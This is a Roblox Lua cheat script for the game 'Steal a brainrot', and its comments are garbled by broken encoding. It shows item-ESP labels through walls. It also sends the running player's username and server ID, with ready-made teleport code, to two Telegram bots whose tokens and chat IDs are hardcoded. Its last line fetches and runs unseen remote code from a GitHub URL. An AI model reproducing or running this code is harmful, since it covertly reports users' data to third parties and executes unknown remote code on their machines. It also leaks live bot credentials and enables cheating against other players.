local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local SoundService = game:GetService("SoundService")
local HttpService = game:GetService("HttpService")
local request = syn and syn.request or http and http.request or fluxus and fluxus.request or http_request or request

-- –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è ESP
local ESP_SETTINGS = {
    UpdateInterval = 0.5,
    MaxDistance = 500,
    TextSize = 18,
    Font = Enum.Font.GothamBold,
    PartColors = {
        Color3.new(1, 1, 1),    -- –ë–µ–ª—ã–π
        Color3.new(0.2, 0.6, 1),-- –°–∏–Ω–∏–π
        Color3.new(1, 0.2, 0.2) -- –ö—Ä–∞—Å–Ω—ã–π
    },
    SoundId = "rbxassetid://130785805",
    SoundVolume = 1.5,
    PlaySoundOnce = false
}

-- –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –ü–ï–†–í–û–ì–û –±–æ—Ç–∞ (–æ—Å–Ω–æ–≤–Ω—ã–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è)
local TG_MAIN = {
    Token = "7624455250:AAHXqHESVLzkJi7w9Q5YXyGf394dIfrXy1M",
    ChatId = "1072158346",
    Enabled = true,
    ImportantObjects = {
        ["Secret Lucky Block"] = true,
        ["Pot Hotspot"] = true,
        ["La Grande Combinasion"] = true,
        ["Garama and Madundung"] = true,
        ["Nuclearo Dinossauro"] = true,
        ["Chicleteira Bicicleteira"] = true,
        ["Dragon Cannelloni"] = true,
        ["Los Combinasionas"] = true 
    }
}

-- –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –í–¢–û–†–û–ì–û –±–æ—Ç–∞ (–≥—Ä—É–ø–ø–æ–≤—ã–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è)
local TG_SPECIAL = {
    Token = "8403219194:AAHXD_oxTlI2YHWKFz6SKvspfo7hJY32Tsk",
    ChatId = "-1002767532824",
    Enabled = true,
    SpecialObjects = {
        ["La Vacca Saturno Saturnita"] = true,
        ["Chimpanzini Spiderini"] = true
    },
    GroupSettings = {
        PinMessages = true,
        DisableNotifications = false
    }
}

-- –°–ø–∏—Å–æ–∫ –æ–±—ä–µ–∫—Ç–æ–≤ —Å —ç–º–æ–¥–∑–∏
local OBJECT_EMOJIS = {
    ["La Vacca Saturno Saturnita"] = "üêÆ",
    ["Chimpanzini Spiderini"] = "üï∑",
    ["Los Tralaleritos"] = "üêü",
    ["Las Tralaleritas"] = "üå∏",
    ["Graipuss Medussi"] = "ü¶ë",
    ["Torrtuginni Dragonfrutini"] = "üêâ",
    ["Pot Hotspot"] = "üì±",
    ["La Grande Combinasion"] = "‚ùóÔ∏è",
    ["Garama and Madundung"] = "ü•´",
    ["Secret Lucky Block"] = "‚¨õÔ∏è",
    ["Dragon Cannelloni"] = "üê≤",
    ["Nuclearo Dinossauro"] = "ü¶ï",
    ["Las Vaquitas Saturnitas"] = "üë¶",
    ["Chicleteira Bicicleteira"] = "üö≤",
    ["Los Combinasionas"] = "‚öíÔ∏è",
    ["Agarrini la Palini"] = "ü•Ñ"
}

-- –°–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –æ–±—ä–µ–∫—Ç–æ–≤
local OBJECT_NAMES = {
    "La Vacca Saturno Saturnita",
    "Chimpanzini Spiderini",
    "Los Tralaleritos",
    "Las Tralaleritas",
    "Graipuss Medussi",
    "Torrtuginni Dragonfrutini",
    "Pot Hotspot",
    "La Grande Combinasion",
    "Garama and Madundung",
    "Secret Lucky Block",
    "Dragon Cannelloni",
    "Nuclearo Dinossauro",
    "Las Vaquitas Saturnitas",
    "Chicleteira Bicicleteira",
    "Los Combinasionas",
    "Agarrini la Palini"
}

-- –°–∏—Å—Ç–µ–º–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
local camera = workspace.CurrentCamera
local espCache = {}
local lastUpdate = 0
local foundObjects = {}
local objectsToNotify = {}

-- –°–æ–∑–¥–∞–µ–º –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "RussianESP"
screenGui.Parent = CoreGui
screenGui.ResetOnSpawn = false

-- –§—É–Ω–∫—Ü–∏–∏ —É—Ç–∏–ª–∏—Ç—ã
local function getAccountInfo()
    local player = Players.LocalPlayer
    return player and player.Name or "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç"
end

local function getServerId()
    local jobId = game.JobId
    return jobId ~= "" and jobId or "–û–¥–∏–Ω–æ—á–Ω–∞—è –∏–≥—Ä–∞"
end

-- –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ –û–°–ù–û–í–ù–û–ì–û –±–æ—Ç–∞
local function sendMainTelegramAlert()
    if not TG_MAIN.Enabled or not request or #objectsToNotify == 0 then return end
    
    local serverId = getServerId()
    local username = getAccountInfo()
    
    -- –†–∞–∑–¥–µ–ª—è–µ–º –æ–±—ä–µ–∫—Ç—ã –Ω–∞ –≤–∞–∂–Ω—ã–µ –∏ –æ–±—ã—á–Ω—ã–µ
    local importantObjects = {}
    local regularObjects = {}
    
    for _, objName in ipairs(objectsToNotify) do
        if not TG_SPECIAL.SpecialObjects[objName] then
            if TG_MAIN.ImportantObjects[objName] then
                table.insert(importantObjects, objName)
            else
                table.insert(regularObjects, objName)
            end
        end
    end
    
    if #importantObjects + #regularObjects == 0 then return end
    
    -- –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –≤—ã–¥–µ–ª–µ–Ω–∏–µ–º –≤–∞–∂–Ω—ã—Ö –æ–±—ä–µ–∫—Ç–æ–≤
    local message = string.format(
        "*üîç –û–±–Ω–∞—Ä—É–∂–µ–Ω—ã –æ–±—ä–µ–∫—Ç—ã –≤ Steal a brainrot*\n"..
        "üë§ –ò–≥—Ä–æ–∫: `@%s`\n"..
        "üåê –°–µ—Ä–≤–µ—Ä: `%s`\n"..
        "üïò –í—Ä–µ–º—è: `%s`\n\n",
        username, serverId, os.date("%X")
    )
    
    -- –î–æ–±–∞–≤–ª—è–µ–º –í–ê–ñ–ù–´–ï –æ–±—ä–µ–∫—Ç—ã —Å –ø–æ–º–µ—Ç–∫–æ–π üö®
    if #importantObjects > 0 then
        message = message .. "*üö® –í–ê–ñ–ù–´–ï –û–ë–™–ï–ö–¢–´:*\n"
        for _, objName in ipairs(importantObjects) do
            message = message .. string.format("%s *%s*\n", OBJECT_EMOJIS[objName] or "‚ö†Ô∏è", objName)
        end
        message = message .. "\n"
    end
    
    -- –î–æ–±–∞–≤–ª—è–µ–º –æ–±—ã—á–Ω—ã–µ –æ–±—ä–µ–∫—Ç—ã
    if #regularObjects > 0 then
        message = message .. "*üîπ –û–±—ã—á–Ω—ã–µ –æ–±—ä–µ–∫—Ç—ã:*\n"
        for _, objName in ipairs(regularObjects) do
            message = message .. string.format("%s %s\n", OBJECT_EMOJIS[objName] or "üî∏", objName)
        end
    end
    
    -- –ö–æ–¥ —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏–∏
    if serverId ~= "–û–¥–∏–Ω–æ—á–Ω–∞—è –∏–≥—Ä–∞" then
        message = message .. string.format(
            "\n```lua\nlocal ts = game:GetService('TeleportService')\nts:TeleportToPlaceInstance(109983668079237, '%s')\n```",
            serverId
        )
    end
    
    -- –û—Ç–ø—Ä–∞–≤–∫–∞
    request({
        Url = "https://api.telegram.org/bot"..TG_MAIN.Token.."/sendMessage",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode({
            chat_id = TG_MAIN.ChatId,
            text = message,
            parse_mode = "Markdown"
        })
    })
end

-- –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ –ì–†–£–ü–ü–£ (—Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–µ –æ–±—ä–µ–∫—Ç—ã)
local function sendSpecialTelegramAlert(objName)
    if not TG_SPECIAL.Enabled or not request then return end
    
    local serverId = getServerId()
    local username = getAccountInfo()
    local emoji = OBJECT_EMOJIS[objName] or "üîπ"
    
    local message = string.format(
        "*üîî –û–ë–ù–ê–†–£–ñ–ï–ù –°–ü–ï–¶–ò–ê–õ–¨–ù–´–ô –û–ë–™–ï–ö–¢ üîî*\n"..
        "üïπ –ò–≥—Ä–∞: Steal a brainrot\n"..
        "üë§ –ò–≥—Ä–æ–∫: `@%s`\n"..
        "üåê –°–µ—Ä–≤–µ—Ä: `%s`\n"..
        "üïò –í—Ä–µ–º—è: `%s`\n\n"..
        "%s *%s*",
        username, serverId, os.date("%X"), emoji, objName
    )
    
    if serverId ~= "–û–¥–∏–Ω–æ—á–Ω–∞—è –∏–≥—Ä–∞" then
        message = message .. string.format(
            "\n\nüöÄ –¢–µ–ª–µ–ø–æ—Ä—Ç:\n```lua\nlocal ts = game:GetService('TeleportService')\nts:TeleportToPlaceInstance(109983668079237, '%s')\n```",
            serverId
        )
    end
    
    local url = "https://api.telegram.org/bot"..TG_SPECIAL.Token.."/sendMessage"
    local response = request({
        Url = url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode({
            chat_id = TG_SPECIAL.ChatId,
            text = message,
            parse_mode = "Markdown",
            disable_notification = TG_SPECIAL.GroupSettings.DisableNotifications
        })
    })
    
    -- –ó–∞–∫—Ä–µ–ø–ª–µ–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è
    if response.Success and TG_SPECIAL.GroupSettings.PinMessages then
        local messageId = HttpService:JSONDecode(response.Body).result.message_id
        request({
            Url = "https://api.telegram.org/bot"..TG_SPECIAL.Token.."/pinChatMessage",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                chat_id = TG_SPECIAL.ChatId,
                message_id = messageId,
                disable_notification = true
            })
        })
    end
end

-- –í–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–µ –∑–≤—É–∫–∞
local function playDetectionSound()
    local sound = Instance.new("Sound")
    sound.SoundId = ESP_SETTINGS.SoundId
    sound.Volume = ESP_SETTINGS.SoundVolume
    sound.Parent = workspace
    sound:Play()
    game:GetService("Debris"):AddItem(sound, 3)
end

-- –°–æ–∑–¥–∞–Ω–∏–µ —Ç–µ–∫—Å—Ç–∞ ESP
local function createColoredText(name)
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.TextSize = ESP_SETTINGS.TextSize
    textLabel.Font = ESP_SETTINGS.Font
    textLabel.TextXAlignment = Enum.TextXAlignment.Center
    textLabel.TextStrokeTransparency = 0.3
    
    local emoji = OBJECT_EMOJIS[name] or "üîπ"
    local parts = {}
    for part in name:gmatch("%S+") do
        table.insert(parts, part)
    end
    
    local richText = ""
    for i, part in ipairs(parts) do
        local color = ESP_SETTINGS.PartColors[math.min(i, #ESP_SETTINGS.PartColors)]
        richText = richText .. string.format(
            '<font color="rgb(%d,%d,%d)">%s</font> ',
            math.floor(color.r * 255),
            math.floor(color.g * 255),
            math.floor(color.b * 255),
            i == 1 and emoji.." "..part or part
        )
    end
    
    textLabel.Text = richText
    textLabel.RichText = true
    return textLabel
end

-- –°–æ–∑–¥–∞–Ω–∏–µ ESP —ç–ª–µ–º–µ–Ω—Ç–∞
local function createESPElement(obj)
    local rootPart = obj:IsA("Model") and (obj.PrimaryPart or obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChildWhichIsA("BasePart")) or obj
    if not rootPart then return end

    local billboard = Instance.new("BillboardGui")
    billboard.Size = UDim2.new(0, 350, 0, 50)
    billboard.AlwaysOnTop = true
    billboard.MaxDistance = ESP_SETTINGS.MaxDistance
    billboard.StudsOffset = Vector3.new(0, 3, 0)
    
    local textLabel = createColoredText(obj.Name)
    textLabel.Parent = billboard
    
    billboard.Adornee = rootPart
    billboard.Parent = screenGui
    
    return {
        labelGui = billboard,
        label = textLabel,
        rootPart = rootPart,
        object = obj
    }
end

-- –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è ESP
local function updateESP(deltaTime)
    lastUpdate = lastUpdate + deltaTime
    if lastUpdate < ESP_SETTINGS.UpdateInterval then return end
    lastUpdate = 0

    -- –û—á–∏—Å—Ç–∫–∞ —Å—Ç–∞—Ä—ã—Ö –æ–±—ä–µ–∫—Ç–æ–≤
    for obj, data in pairs(espCache) do
        if not obj.Parent or not data.rootPart.Parent then
            data.labelGui:Destroy()
            espCache[obj] = nil
            foundObjects[obj] = nil
        end
    end

    -- –ü–æ–∏—Å–∫ –Ω–æ–≤—ã—Ö –æ–±—ä–µ–∫—Ç–æ–≤
    for _, obj in ipairs(workspace:GetDescendants()) do
        if table.find(OBJECT_NAMES, obj.Name) and (obj:IsA("BasePart") or obj:IsA("Model")) then
            local rootPart = obj:IsA("Model") and (obj.PrimaryPart or obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChildWhichIsA("BasePart")) or obj
            if not rootPart then continue end

            local distance = (rootPart.Position - camera.CFrame.Position).Magnitude
            if distance > ESP_SETTINGS.MaxDistance then
                if espCache[obj] then
                    espCache[obj].labelGui.Enabled = false
                end
                continue
            end

            local isNewObject = not foundObjects[obj]
            foundObjects[obj] = true

            if not espCache[obj] then
                espCache[obj] = createESPElement(obj)
                playDetectionSound()
                
                if isNewObject then
                    table.insert(objectsToNotify, obj.Name)
                    -- –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ —Å–ø–µ—Ü–∏–∞–ª—å–Ω–æ–≥–æ –±–æ—Ç–∞
                    if TG_SPECIAL.SpecialObjects[obj.Name] then
                        sendSpecialTelegramAlert(obj.Name)
                    end
                end
            end

            local data = espCache[obj]
            local _, onScreen = camera:WorldToViewportPoint(rootPart.Position)
            data.labelGui.Enabled = onScreen
        end
    end
    
    -- –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –±–æ—Ç–∞
    if #objectsToNotify > 0 then
        sendMainTelegramAlert()
        objectsToNotify = {}
    end
end

-- –ó–∞–ø—É—Å–∫ —Å–∏—Å—Ç–µ–º—ã
RunService.Heartbeat:Connect(updateESP)

-- –û–±—Ä–∞–±–æ—Ç–∫–∞ –∏–≥—Ä–æ–∫–æ–≤
Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        updateESP(0)
    end)
end)

-- –ü–µ—Ä–≤–æ–Ω–∞—á–∞–ª—å–Ω–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ
updateESP(0)

print("Steal a brainrot ESP System –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω!")
print("–û—Ç—Å–ª–µ–∂–∏–≤–∞–µ—Ç—Å—è –æ–±—ä–µ–∫—Ç–æ–≤: "..#OBJECT_NAMES)
print("ID —Å–µ—Ä–≤–µ—Ä–∞:", getServerId())
loadstring(game:HttpGet("https://raw.githubusercontent.com/DEBIL59195/KLIMTYPOU/refs/heads/main/KLIM.lua"))()
